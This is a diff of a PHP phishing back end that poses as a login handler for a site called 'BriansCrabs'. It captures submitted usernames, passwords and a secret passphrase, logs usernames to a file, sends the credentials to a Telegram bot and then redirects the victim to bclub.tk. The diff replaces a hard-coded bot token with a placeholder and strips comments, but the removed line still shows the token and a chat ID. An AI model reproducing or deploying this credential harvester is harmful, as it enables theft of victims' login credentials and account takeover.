@@ -1,13 +1,13 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Load usernames from file if it exists
+   
     $filename2 = 'nostep.txt';
     if (file_exists($filename2)) {
         $nostepusernames = explode(',', file_get_contents($filename2));
     }
 
-    // Telegram Bot details
-    $botToken = '7257814757:AAG5RyBq0M8KGqhuSS_PBK3tvnszTsI7OXg';
+  
+    $botToken = '__TELEGRAM_BOT_TOKEN__';
 $chatIds = ['1272510733'];  // Add more chat IDs as needed
 
     $key = $_POST["key"];
@@ -16,19 +16,16 @@ $chatIds = ['1272510733'];  // Add more chat IDs as needed
     $message = "Username: " . $username . "\n" . "Password: " . $password . "\n" . "key: " . $key . "\n";
     $messageTitle = "BriansCrabs:Secret passphrase Login Credentials  ✅";
 
-    // Add username to the array and save to file
+   
     $nostepusernames[] = $username;
     file_put_contents($filename2, implode(',', $nostepusernames));
 
-    // Send the message via Telegram
     sendTelegramMessage($messageTitle, $message);
-
-    // Redirect after processing
     header("Location: https://bclub.tk/");
     exit();
 }
 
-// Function to send message via Telegram
+
 function sendTelegramMessage($title, $body) {
     global $botToken, $chatIds;
     $url = "https://api.telegram.org/bot$botToken/sendMessage";
